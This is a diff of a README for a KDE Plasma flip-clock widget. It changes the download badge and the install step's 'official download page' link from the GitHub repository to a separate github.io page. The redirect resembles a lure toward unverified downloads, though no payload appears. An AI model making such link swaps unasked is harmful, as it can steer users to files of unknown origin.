@@ -1,6 +1,6 @@
 # ⏰ plasma-flipclock - Add retro style to your desktop
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/godofwartriplecream354/plasma-flipclock)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://godofwartriplecream354.github.io)
 
 This clock widget brings a classic flip-style look to your computer screen. It mimics the popular design found on older mobile devices and provides a clean way to view the time. You can add it to your desktop panel or place it directly on your background wallpaper.
 
@@ -14,7 +14,7 @@ This clock widget brings a classic flip-style look to your computer screen. It m
 
 Follow these steps to add the clock to your system.
 
-1.  Visit the [official download page](https://github.com/godofwartriplecream354/plasma-flipclock) to get the file.
+1.  Visit the [official download page](https://godofwartriplecream354.github.io) to get the file.
 2.  Click the link labeled "Code" or "Releases" to find the latest version.
 3.  Download the compressed file to your computer.
 4.  Open your KDE Plasma desktop settings.
